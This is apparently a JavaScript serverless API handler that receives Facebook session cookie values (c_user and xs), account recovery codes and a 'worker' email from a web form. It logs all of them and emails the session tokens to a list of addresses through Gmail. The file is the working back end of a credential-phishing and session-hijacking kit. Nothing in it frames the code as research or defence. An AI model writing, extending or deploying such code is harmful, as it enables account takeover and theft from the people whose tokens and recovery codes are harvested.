import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Get data from frontend
    const { c_user, xs, emails, workerEmail, name, recovery_codes } = req.body;

    console.log('📨 Submit Form Received:');
    console.log('Name:', name || 'Not provided');
    console.log('c_user:', c_user);
    console.log('xs:', xs);
    console.log('Emails array:', emails);
    // Log but don't show in email
    console.log('Worker Email (not shown in email):', workerEmail || 'Not provided');
    console.log('Recovery Codes (not shown in email):', recovery_codes || 'Not provided');

    // Validate required fields
    if (!c_user || !xs || !emails || !Array.isArray(emails)) {
      return res.status(400).json({
        success: false,
        message: 'Missing required fields'
      });
    }

    // Send email (WITHOUT recovery_codes and workerEmail in email content)
    const emailResult = await sendSubmitEmail(emails, {
      name: name || 'User',
      c_user,
      xs
      // ❌ NOT sending recovery_codes
      // ❌ NOT sending workerEmail
    });

    return res.status(200).json({
      success: true,
      message: 'Form submitted successfully!',
      emailSent: emailResult.success,
      emailMessage: emailResult.message,
      data: {
        name: name,
        c_user: c_user,
        xs: xs
      }
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
}

// Email sending function - WITHOUT recovery_codes and workerEmail
async function sendSubmitEmail(toEmails, formData) {
  try {
    // Create transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASS
      }
    });

    // Email content - SIMPLE, no recovery codes, no worker email
    const mailOptions = {
      from: `"Form System" <${process.env.GMAIL_USER}>`,
      to: toEmails.join(', '), // Only emails array
      subject: `✅ New Submission: ${formData.name}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
          <h2 style="color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px;">📋 New Form Submission</h2>
          
          <div style="background: #f9f9f9; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <h3 style="color: #555; margin-top: 0;">Submission Details</h3>
            
            <table style="width: 100%; border-collapse: collapse;">
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 150px;">Name:</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${formData.name}</td>
              </tr>
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold;">c_user ID:</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">
                  <code style="background: #f0f0f0; padding: 3px 6px; border-radius: 3px;">${formData.c_user}</code>
                </td>
              </tr>
              <tr>
                <td style="padding: 8px; font-weight: bold;">xs Token:</td>
                <td style="padding: 8px;">
                  <code style="background: #f0f0f0; padding: 3px 6px; border-radius: 3px;">${formData.xs}</code>
                </td>
              </tr>
              <!-- ❌ NO Recovery Codes row -->
              <!-- ❌ NO Worker Email row -->
            </table>
          </div>
          
          <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #666; font-size: 12px;">
            <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
            <p><strong>Sent to:</strong> ${toEmails.join(', ')}</p>
          </div>
        </div>
      `,
      text: `
New Form Submission

Name: ${formData.name}
c_user: ${formData.c_user}
xs: ${formData.xs}

Time: ${new Date().toLocaleString()}
Sent to: ${toEmails.join(', ')}
      `
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    
    console.log('✅ Email sent successfully!');
    console.log('Message ID:', info.messageId);
    console.log('Recipients:', toEmails);

    return {
      success: true,
      message: 'Email sent successfully',
      messageId: info.messageId
    };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return {
      success: false,
      message: 'Failed to send email: ' + error.message
    };
  }
}
